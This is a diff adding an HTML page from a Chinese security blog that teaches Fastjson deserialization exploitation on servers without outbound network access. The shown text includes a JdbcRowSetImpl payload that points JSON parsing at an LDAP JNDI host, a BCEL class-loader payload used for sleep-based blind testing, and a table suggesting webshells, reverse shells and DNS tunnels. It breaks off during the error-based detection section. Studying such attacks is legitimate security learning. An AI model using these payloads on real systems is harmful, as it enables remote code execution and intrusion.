@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="当发现一个使用Fastjson反序列化漏洞的点，但目标服务器**无法访问公网（不出网）** 时，传统的“反弹Shell”或“下载执行”的利用方式会立即失效。核心思路要从“直接获取反向连接”转变为“在目标服务器内部执行操作”，并利用内部资源来达成目标。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson反序列化不出网利用">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/26/Java%E6%94%BB%E9%98%B2/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="当发现一个使用Fastjson反序列化漏洞的点，但目标服务器**无法访问公网（不出网）** 时，传统的“反弹Shell”或“下载执行”的利用方式会立即失效。核心思路要从“直接获取反向连接”转变为“在目标服务器内部执行操作”，并利用内部资源来达成目标。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250926141610076.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250926141716804.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250926183917771.png">
+<meta property="article:published_time" content="2025-09-26T15:37:38.000Z">
+<meta property="article:modified_time" content="2025-09-26T15:42:31.824Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20250926141610076.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/09/26/Java%E6%94%BB%E9%98%B2/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/09/26/Java%E6%94%BB%E9%98%B2/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/","path":"2025/09/26/Java攻防/Fastjson反序列化不出网利用/","title":"Fastjson反序列化不出网利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Fastjson反序列化不出网利用 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="nav-number">1.</span> <span class="nav-text">Fastjson不出网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text">不出网判断是否有漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD%EF%BC%881%EF%BC%89"><span class="nav-number">1.1.1.</span> <span class="nav-text">一、延时判断（1）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BB%B6%E8%BF%9F%EF%BC%88Sleep%EF%BC%89%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B5%8B%EF%BC%882%EF%BC%89"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用延迟（Sleep）进行盲测（2）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%EF%BC%88Error-based%EF%BC%89"><span class="nav-number">1.1.3.</span> <span class="nav-text">二：利用报错信息（Error-based）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%88%E5%A6%82%E6%9E%9C%E5%8F%AF%E8%83%BD%EF%BC%89"><span class="nav-number">1.1.4.</span> <span class="nav-text">三：利用本地文件读取（如果可能）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%EF%BC%9A%E5%88%A9%E7%94%A8%E8%B5%84%E6%BA%90%E5%88%9B%E5%BB%BA%E6%88%96%E4%BF%AE%E6%94%B9%EF%BC%88%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">1.1.5.</span> <span class="nav-text">四：利用资源创建或修改（侧信道攻击）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E6%93%8D%E4%BD%9C%E5%BB%BA%E8%AE%AE%E4%B8%8E%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.6.</span> <span class="nav-text">实际操作建议与流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.7.</span> <span class="nav-text">方法总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BA%E7%BD%91%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%89%E6%9C%89%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E6%BC%8F%E6%B4%9E%EF%BC%89%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">出网（不出网）有漏洞（无漏洞）总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%89%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%8E%8B%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">利用（有漏洞不出王的情况）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL-Tomcat-Spring%E9%93%BE"><span class="nav-number">1.3.1.</span> <span class="nav-text">BCEL-Tomcat&amp;Spring链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gadget%E9%93%BE%EF%BC%9Apoc"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">gadget链：poc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">条件：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%88%B6%E4%BD%9C%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="nav-number">1.3.1.3.1.</span> <span class="nav-text">一、制作恶意类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%9F%E6%88%90BCEL%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.3.1.3.2.</span> <span class="nav-text">生成BCEL字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-number">1.3.1.3.3.</span> <span class="nav-text">构造payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl%E9%93%BE"><span class="nav-number">1.3.2.</span> <span class="nav-text">TemplatesImpl链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81TemplatesImpl-%E9%93%BE%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">一、TemplatesImpl 链核心原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E7%9A%84%E5%85%B3%E9%94%AE%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">二、利用成功的关键条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">复现步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#pom-xml"><span class="nav-number">1.3.2.3.1.</span> <span class="nav-text">pom.xml</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8F%E7%B1%BBEvilClass-java"><span class="nav-number">1.3.2.3.2.</span> <span class="nav-text">编写恶意类EvilClass.java</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload-1"><span class="nav-number">1.3.2.3.3.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8poc%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.2.3.4.</span> <span class="nav-text">利用poc复现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C3P0%E9%93%BE"><span class="nav-number">1.3.3.</span> <span class="nav-text">C3P0链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%94%A7-%E5%A4%8D%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.3.4.</span> <span class="nav-text">🔧 复现详细步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E5%87%86%E5%A4%87%E7%8E%AF%E5%A2%83%E4%B8%8E%E4%BE%9D%E8%B5%96"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">步骤 1：准备环境与依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E7%94%9F%E6%88%90HEX%E8%BD%BD%E8%8D%B7"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">步骤 2：生成HEX载荷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E6%9E%84%E9%80%A0%E5%B9%B6%E8%A7%A6%E5%8F%91PoC"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">步骤 3：构造并触发PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%9A%A0%EF%B8%8F-%E5%85%B3%E9%94%AE%E8%A6%81%E7%82%B9%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">1.3.5.</span> <span class="nav-text">⚠️ 关键要点与常见问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%92%A1-%E4%B8%8ETemplatesImpl%E9%93%BE%E7%9A%84%E5%AF%B9%E6%AF%94"><span class="nav-number">1.3.6.</span> <span class="nav-text">💡 与TemplatesImpl链的对比</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/09/26/Java%E6%94%BB%E9%98%B2/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Fastjson反序列化不出网利用 | 子非鱼的博客">
+      <meta itemprop="description" content="当发现一个使用Fastjson反序列化漏洞的点，但目标服务器**无法访问公网（不出网）** 时，传统的“反弹Shell”或“下载执行”的利用方式会立即失效。核心思路要从“直接获取反向连接”转变为“在目标服务器内部执行操作”，并利用内部资源来达成目标。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fastjson反序列化不出网利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-26 23:37:38 / 修改时间：23:42:31" itemprop="dateCreated datePublished" datetime="2025-09-26T23:37:38+08:00">2025-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">当发现一个使用Fastjson反序列化漏洞的点，但目标服务器**无法访问公网（不出网）** 时，传统的“反弹Shell”或“下载执行”的利用方式会立即失效。核心思路要从“直接获取反向连接”转变为“在目标服务器内部执行操作”，并利用内部资源来达成目标。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="Fastjson不出网"><a href="#Fastjson不出网" class="headerlink" title="Fastjson不出网"></a>Fastjson不出网</h1><p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11938">https://xz.aliyun.com/news/11938</a></p>
+<p>​					<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
+<p>当发现一个使用Fastjson反序列化漏洞的点，但目标服务器<strong>无法访问公网（不出网）</strong> 时，传统的“反弹Shell”或“下载执行”的利用方式会立即失效。</p>
+<p>核心思路要从“直接获取反向连接”转变为“在目标服务器内部执行操作”，并利用内部资源来达成目标。</p>
+<p>不出网的可能情况：</p>
+<table>
+<thead>
+<tr>
+<th align="left">不出网场景</th>
+<th align="left">特点</th>
+<th align="left">可能的利用思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>完全隔离</strong></td>
+<td align="left">无任何外网连接</td>
+<td align="left">1. <strong>写入本地Webshell</strong>（最优先） 2. 信息收集，为横向移动做准备 3. 攻击内网其他服务（如Redis, MySQL, 其他Web应用）</td>
+</tr>
+<tr>
+<td align="left"><strong>有HTTP&#x2F;HTTPS出网</strong></td>
+<td align="left">只能走80&#x2F;443端口</td>
+<td align="left">1. <strong>使用HTTPS&#x2F;WebSocket反向Shell</strong> 2. 使用<code>curl</code>&#x2F;<code>wget</code>等命令行HTTP工具下载文件 3. 使用HTTP隧道工具（如reGeorg, TinyShell）</td>
+</tr>
+<tr>
+<td align="left"><strong>仅DNS出网</strong></td>
+<td align="left">只能发DNS查询</td>
+<td align="left">1. <strong>使用DNS隧道工具</strong>（如iodine, dnscat2）</td>
+</tr>
+<tr>
+<td align="left"><strong>有网络但受限（如NAT）</strong></td>
+<td align="left">可出网，但不可入网</td>
+<td align="left">1. <strong>使用反向连接</strong>（让目标连你） 2. 使用ICMP隧道等隐蔽隧道</td>
+</tr>
+</tbody></table>
+<h2 id="不出网判断是否有漏洞"><a href="#不出网判断是否有漏洞" class="headerlink" title="不出网判断是否有漏洞"></a>不出网判断是否有漏洞</h2><h3 id="一、延时判断（1）"><a href="#一、延时判断（1）" class="headerlink" title="一、延时判断（1）"></a>一、延时判断（1）</h3><p>在之前的fastjson1.2.24为例，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> NoNetwork;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录开始时间</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;  \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,  \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;dataSourceName\&quot;:\&quot;ldap://10.56.93.60:1389/m6r1fy\&quot;,  \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;autoCommit\&quot;:true  \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JSON.parse(poc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录结束时间并计算耗时</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="type">long</span> <span class="variable">duration</span> <span class="operator">=</span> endTime - startTime;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON解析执行时间: &quot;</span> + duration + <span class="string">&quot; 毫秒&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个代码除了执行反序列化还是统计代码运行的时间，当能够正常弹出计算器的时候，</p>
+<p><img src="/./images/image-20250926141610076.png" alt="image-20250926141610076"></p>
+<p>可以看到执行时间大约450毫秒左右，但是当给一个错误的jndi地址的时候（修改一下端口）</p>
+<p><img src="/./images/image-20250926141716804.png" alt="image-20250926141716804"></p>
+<p>执行时间明显变慢</p>
+<p>当目标存在 FastJSON 反序列化漏洞（如 1.2.24 版本）且<code>autoTypeSupport</code>未禁用时，解析包含<code>JdbcRowSetImpl</code>的恶意 JSON 会触发以下行为：</p>
+<ol>
+<li>实例化<code>JdbcRowSetImpl</code>并调用其<code>setDataSourceName</code>方法，传入 LDAP&#x2F;RMI 地址；</li>
+<li>调用<code>setAutoCommit</code>方法时，内部会触发<code>connect()</code>尝试连接指定的 LDAP&#x2F;RMI 服务。</li>
+</ol>
+<p>此时的延时差异源于：</p>
+<ul>
+<li><strong>有效地址（但无实际服务）</strong>：目标会尝试建立网络连接，经历 TCP 三次握手超时（通常约 2-3 秒），导致总耗时较长；</li>
+<li><strong>无效地址（如错误端口）</strong>：可能快速触发 “连接被拒绝”（端口未开放），耗时较短；</li>
+<li><strong>无漏洞</strong>：仅进行普通 JSON 解析，无网络操作，耗时极短（通常几十毫秒内）。</li>
+</ul>
+<h3 id="利用延迟（Sleep）进行盲测（2）"><a href="#利用延迟（Sleep）进行盲测（2）" class="headerlink" title="利用延迟（Sleep）进行盲测（2）"></a>利用延迟（Sleep）进行盲测（2）</h3><p>这是最经典、最可靠的盲测方法。</p>
+<ul>
+<li><p><strong>原理</strong>： 构造一个能执行 <code>Thread.sleep()</code>的Payload。如果漏洞存在，服务器在处理请求时会“卡住”一段时间，然后才返回响应。通过比较响应时间，可以判断代码是否被执行。</p>
+</li>
+<li><p><strong>步骤</strong>：<strong>发送正常请求</strong>： 先发送一个合法的JSON请求，记录响应时间（例如，100毫秒）。这是基准时间。<strong>发送Sleep Payload</strong>： 发送一个包含 <code>Thread.sleep(10000)</code>（睡眠10秒）的恶意JSON。<strong>观察响应时间</strong>：<strong>如果漏洞存在</strong>： 服务器会停顿大约10秒后才响应。你收到的响应时间会远大于10秒（加上网络和处理时间）。<strong>如果漏洞不存在</strong>： 服务器会立即返回错误（如500错误）或正常处理，响应时间与基准时间相近。</p>
+</li>
+<li><p><strong>Payload示例（概念性）</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">  &quot;x&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;driverClassName&quot;: &quot;$$BCEL$$$...&quot; // 这里是编译并BCEL编码后的Sleep类</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>优点</strong>： 结果非常明确，误报率低。</p>
+</li>
+<li><p><strong>缺点</strong>：需要提前将Sleep逻辑编译成类文件，并转换为BCEL或其它格式，过程繁琐。可能会被WAF识别和拦截。对服务器性能有短暂影响，在高并发环境需谨慎使用。</p>
+</li>
+</ul>
+<hr>
+<h3 id="二：利用报错信息（Error-based）"><a href="#二：利用报错信息（Error-based）" class="headerlink" title="二：利用报错信息（Error-based）"></a>二：利用报错信息（Error-based）</h3><ul>
+<li><p><strong>原理</strong>： 构造一个Payload，让Fastjson在反序列化过程中尝试访问不存在的类、方法或字段，从而触发一个包含特定关键词的Java异常。通过检查HTTP响应的状态码和Body内容，可以判断漏洞是否存在。</p>
+</li>
